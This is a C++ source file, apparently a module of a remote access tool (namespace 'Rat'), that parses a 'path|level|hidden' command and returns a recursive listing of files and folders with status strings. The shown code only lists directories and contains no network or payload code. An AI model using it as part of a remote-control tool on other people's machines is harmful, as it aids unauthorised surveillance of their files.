#include "FileFolderUtils.hpp"
#include <dirent.h>
#include <string.h>
#include <sstream>
#include <iostream>
#include <limits>

namespace Rat
{
    // input format: "path|level|include_hidden" example /home/quang/Downloads|2|1
    std::string FileFolderUtils::listFilesFolders(const std::string &input, std::string &response)
    {
        std::cout << "Start parsing input: " << input << std::endl;

        auto parsed = parsePathAndLevel(input);
        if (!parsed.has_value())
        {
            response = "LIST FILES AND FOLDER | ARGUMENT ERROR | INVALID FORMAT";
            return "";
        }

        std::string path;
        uint32_t level;
        bool include_hidden;
        std::tie(path, level, include_hidden) = parsed.value();

        if (level > 5)
        {
            response = "LIST FILES AND FOLDER | ARGUMENT ERROR | LEVEL TOO DEEP";
            return "";
        }

        if (path.length() > 4096)
        {
            response = "LIST FILES AND FOLDER | ARGUMENT ERROR | PATH TOO LONG";
            return "";
        }

        std::vector<std::string> items;
        traverseDirectory(path, 0, level, items, include_hidden);

        if (items.empty())
        {
            response = "LIST FILES AND FOLDER | ARGUMENT ERROR | CANNOT OPEN DIRECTORY";
            return "";
        }

        response = "LIST FILES AND FOLDER | SUCCESS";
        return formatFileFolderList(items);
    }

    // Output format for each item: "level:path/name"
    // Example: "1:/home/user/Documents/file.txt"
    void FileFolderUtils::traverseDirectory(const std::string &path, uint32_t current_level, uint32_t max_level,
                                            std::vector<std::string> &result, bool include_hidden)
    {
        DIR *dir = opendir(path.c_str());
        if (!dir)
            return;

        struct dirent *entry;
        while ((entry = readdir(dir)) != nullptr)
        {
            std::string name(entry->d_name);
            if (name.empty() || name == "." || name == "..")
                continue;
            if (name[0] == '.' && !include_hidden)
                continue;

            result.push_back(std::to_string(current_level) + ":" + path + "/" + name);

            if (entry->d_type == DT_DIR && current_level < max_level)
            {
                traverseDirectory(path + "/" + name, current_level + 1, max_level, result, include_hidden);
            }
        }
        closedir(dir);
    }

    std::string FileFolderUtils::formatFileFolderList(const std::vector<std::string> &items)
    {
        std::ostringstream oss;
        for (const auto &item : items)
        {
            oss << item << "\n";
        }
        return oss.str();
    }

    std::optional<std::tuple<std::string, uint32_t, bool>> FileFolderUtils::parsePathAndLevel(const std::string &input)
    {
        size_t first_sep = input.find('|');
        size_t last_sep = input.rfind('|');
        if (first_sep == std::string::npos || last_sep == std::string::npos || first_sep == last_sep)
            return std::nullopt;

        std::string path = input.substr(0, first_sep);
        std::string levelStr = input.substr(first_sep + 1, last_sep - first_sep - 1);
        std::string hiddenStr = input.substr(last_sep + 1);

        uint32_t level = 0;
        try
        {
            level = std::stoul(levelStr);
        }
        catch (...)
        {
            return std::nullopt;
        }

        bool include_hidden;
        if (hiddenStr == "1")
        {
            include_hidden = true;
        }
        else if (hiddenStr == "0")
        {
            include_hidden = false;
        }
        else
        {
            return std::nullopt;
        }

        return std::make_tuple(path, level, include_hidden);
    }
}